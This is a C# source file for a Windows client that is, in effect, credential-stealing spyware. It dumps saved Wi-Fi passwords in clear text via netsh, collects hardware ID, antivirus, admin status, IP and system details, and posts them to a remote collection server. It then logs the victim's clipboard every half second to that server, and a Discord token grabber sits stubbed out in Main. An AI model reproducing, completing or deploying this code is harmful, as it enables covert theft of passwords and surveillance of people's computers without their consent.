using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;
using TextCopy;
using System;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Threading;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;

namespace ClientCSharp;

internal static class Program
{
    private static readonly HttpClient Client = new();

    // private static readonly string webhook = "";

    private static readonly string RemoteServer = "127.0.0.1:5000";
    private static readonly string Protocol = "http";

    private static string previousClipboardContent = "";

    private static Mutex mutex;


    private static string GetWifiPasswords()
    {
        var wifis = "";

        var processInfo = new ProcessStartInfo("netsh", "wlan show profiles")
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        var process = Process.Start(processInfo);
        if (process != null)
        {
            var output = process.StandardOutput.ReadToEnd();
            var lines = output.Split('\n');
            foreach (var line in lines)
                if (line.Contains("All User Profile"))
                {
                    var profileName = line.Split(':')[1].Trim();
                    processInfo = new ProcessStartInfo("netsh", $"wlan show profile \"{profileName}\" key=clear")
                    {
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    process = Process.Start(processInfo);
                    if (process != null)
                    {
                        output = process.StandardOutput.ReadToEnd();
                        var resultLines = output.Split('\n');
                        foreach (var resultLine in resultLines)
                            if (resultLine.Contains("Key Content"))
                            {
                                var password = resultLine.Split(':')[1].Trim();
                                wifis += $"\n{profileName,-30}|  {password} <br>";
                                break;
                            }
                    }
                }
        }

        return wifis;
    }

    private static string GetHWID()
    {
        var CMD = "wmic csproduct get UUID";
        var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
        {
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            UseShellExecute = false
        };

        var proc = new Process
        {
            StartInfo = procStartInfo
        };
        proc.Start();
        return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
    }

    private static string GetAntivirus()
    {
        try
        {
            using (ManagementObjectCollection wmiData =
                   new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
            {
                foreach (ManagementBaseObject item in wmiData)
                {
                    return item["displayName"]?.ToString();
                }
            }
        }
        catch
        {
            return "fucking error (catch)";
        }
        return "fucking error";
    }

    private static string SystemInformation()
    {
        var text = "";
        text += new string('=', 20) + "System Information" + new string('=', 20) + "\n";
        text += $"System: {Environment.OSVersion.VersionString}\n";
        text += $"Node Name: {Environment.MachineName}\n";
        text += $"Release: {Environment.OSVersion.VersionString}\n";
        text += $"Version: {Environment.OSVersion.Version}\n";
        text += $"Machine: {Environment.MachineName}\n";
        var CPUName = Convert.ToString(Registry.GetValue(
            "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", null));
        text += $"Processor: {CPUName}\n";
        try
        {
            var ipAddress = Client.GetStringAsync("https://api.ipify.org").Result;
            text += $"IP Address: {ipAddress}\n";
        }
        catch (Exception ex)
        {
            text += $"Failed to retrieve IP Address: {ex.Message}\n";
        }

        // Boot Time
        text += new string('=', 20) + "Up Time" + new string('=', 20) + "\n";

        long tickCount = Environment.TickCount;
        var uptime = TimeSpan.FromMilliseconds(tickCount);
        var lastBootTime = DateTime.Now - uptime;

        text += $"Boot Time: {lastBootTime}\n";

        // CPU Info
        text += new string('=', 20) + "CPU Info" + new string('=', 20) + "\n";
        var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        text += $"Physical cores: {Environment.ProcessorCount / 2}\n";
        text += $"Total cores: {Environment.ProcessorCount}\n";
        text += $"Total CPU Usage: {cpuCounter.NextValue():F2}%\n";
        
        // Other
        text += new string('=', 20) + "Other" + new string('=', 20) + "\n";
        text += $"Admin rights: {IsAdministrator()}\n";
        text += $"UUID: {GetHWID()}\n";
        text += $"Antivirus: {GetAntivirus()}\n";

        var output = "";

        var info = new ProcessStartInfo();
        info.FileName = "wmic";
        info.Arguments = "OS get FreePhysicalMemory,TotalVisibleMemorySize /Value";
        info.RedirectStandardOutput = true;

        using (var process = Process.Start(info))
        {
            output = process.StandardOutput.ReadToEnd();
        }

        var lines = output.Trim().Split("\n");
        var freeMemoryParts = lines[0].Split("=", StringSplitOptions.RemoveEmptyEntries);
        var totalMemoryParts = lines[1].Split("=", StringSplitOptions.RemoveEmptyEntries);

        var metrics = new MemoryMetrics();
        metrics.Total = Math.Round(double.Parse(totalMemoryParts[1]) / 1024, 0);
        metrics.Free = Math.Round(double.Parse(freeMemoryParts[1]) / 1024, 0);
        metrics.Used = metrics.Total - metrics.Free;
        text += new string('=', 20) + "Memory Information" + new string('=', 20) + "\n";
        text += $"Total: {metrics.Total} MB\n";
        text += $"Used : {metrics.Used} MB\n";
        text += $"Free : {metrics.Free} MB\n";

        // Disk Information
        text += new string('=', 20) + "Disk Information" + new string('=', 20) + "\n";
        text += "Partitions and Usage:\n";
        var allDrives = DriveInfo.GetDrives();
        foreach (var drive in allDrives)
        {
            text += $"=== Device: {drive.Name} ===\n";
            text += $"  Volume label: {drive.VolumeLabel}\n";
            text += $"  File system type: {drive.DriveFormat}\n";
            if (drive.IsReady)
            {
                var totalSizeGB = (double)drive.TotalSize / (1024 * 1024 * 1024);
                var usedGB = (drive.TotalSize - (double)drive.TotalFreeSpace) / (1024 * 1024 * 1024);
                var freeGB = (double)drive.TotalFreeSpace / (1024 * 1024 * 1024);
                var percentageUsed = usedGB / totalSizeGB * 100;

                text += $"  Total Size: {totalSizeGB:F2} GB\n";
                text += $"  Used: {usedGB:F2} GB\n";
                text += $"  Free: {freeGB:F2} GB\n";
                text += $"  Percentage: {percentageUsed:F2}%\n";
            }
        }


        return text;
    }

    private static async void clipboardLogger(string clientId)
    {
        var clipboardContent = await ClipboardService.GetTextAsync();
        if (clipboardContent != previousClipboardContent)
        {
            previousClipboardContent = clipboardContent;
            var formattedDate = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
            var data = new
            {
                text = $"<br>{formattedDate}: {clipboardContent}"
            };

            var jsonData = JsonSerializer.Serialize(data);

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
            

            var response = await Client.PostAsync($"{Protocol}://{RemoteServer}/send_clipboard?id={clientId}", content);
        }
    }

    public static bool IsAdministrator()
    {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }

    private static async Task Main()
    {
        /*
        foreach (string str in GetTokens())
        {
            Console.WriteLine(str);
        }
        */

        //GetDiscordTokens();
        const string appName = "MyAppName";
        bool createdNew;

        mutex = new Mutex(true, appName, out createdNew);

        if (!createdNew) Environment.Exit(1);

        var data = new
        {
            uuid = GetHWID(),
            osInfo = SystemInformation(),
            wifis = GetWifiPasswords(),
            discordInfo = "GetTokens()"
        };

        var jsonData = JsonSerializer.Serialize(data);

        var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

        var clientId = "";

        try
        {
            var response = await Client.PostAsync($"{Protocol}://{RemoteServer}/client", content);

            clientId = await response.Content.ReadAsStringAsync();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to connect to the server: {ex.Message}\n");
            Environment.Exit(1);
        }

        Console.WriteLine(clientId);

        while (true)
        {
            await Task.Delay(500);

            clipboardLogger(clientId);
        }
    }

    public class MemoryMetrics
    {
        public double Free;
        public double Total;
        public double Used;
    }
}